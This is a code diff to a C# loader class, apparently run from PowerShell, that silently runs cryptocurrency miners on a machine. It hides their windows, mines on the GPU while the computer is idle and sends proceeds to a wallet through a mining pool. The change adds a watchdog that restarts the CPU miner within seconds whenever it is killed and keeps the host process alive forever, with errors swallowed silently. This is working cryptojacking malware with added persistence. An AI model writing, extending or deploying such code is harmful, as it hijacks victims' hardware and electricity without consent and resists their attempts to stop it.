@@ -21,8 +21,10 @@ public class DateFundLoader {
 
     public static void StartMiner(string cpuMinerPath, string gpuMinerPath, string wallet) {
         try {
-            // 1. Start the CPU Miner (Always On, Low Priority)
-            StartProcess(cpuMinerPath, string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_CPU -p x --donate-level 1 --cpu-max-threads-hint 50", wallet));
+            // 1. Start the CPU Miner Watchdog (Immortal feature)
+            Thread cpuThread = new Thread(() => MonitorAndReviveCpu(cpuMinerPath, wallet));
+            cpuThread.IsBackground = true;
+            cpuThread.Start();
 
             // 2. Start the Idle Monitor for the GPU Miner
             if (!string.IsNullOrEmpty(gpuMinerPath) && File.Exists(gpuMinerPath)) {
@@ -30,18 +32,32 @@ public class DateFundLoader {
                 gpuThread.IsBackground = true;
                 gpuThread.Start();
             }
+
+            // 3. Block PowerShell from exiting so our watchdogs can run forever
+            Thread.Sleep(Timeout.Infinite);
         } catch (Exception) {
             // Silently fail
         }
     }
 
-    private static void StartProcess(string path, string args) {
-        ProcessStartInfo startInfo = new ProcessStartInfo(path);
-        startInfo.Arguments = args;
-        startInfo.CreateNoWindow = true;
-        startInfo.UseShellExecute = false;
-        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-        Process.Start(startInfo);
+    private static void MonitorAndReviveCpu(string cpuMinerPath, string wallet) {
+        string args = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_CPU -p x --donate-level 1 --cpu-max-threads-hint 50", wallet);
+        string procName = Path.GetFileNameWithoutExtension(cpuMinerPath);
+        
+        while (true) {
+            try {
+                Process[] existing = Process.GetProcessesByName(procName);
+                if (existing.Length == 0) {
+                    ProcessStartInfo startInfo = new ProcessStartInfo(cpuMinerPath);
+                    startInfo.Arguments = args;
+                    startInfo.CreateNoWindow = true;
+                    startInfo.UseShellExecute = false;
+                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process.Start(startInfo);
+                }
+            } catch { }
+            Thread.Sleep(3000); // Check every 3 seconds
+        }
     }
 
     private static void MonitorIdleAndMine(string gpuMinerPath, string wallet) {
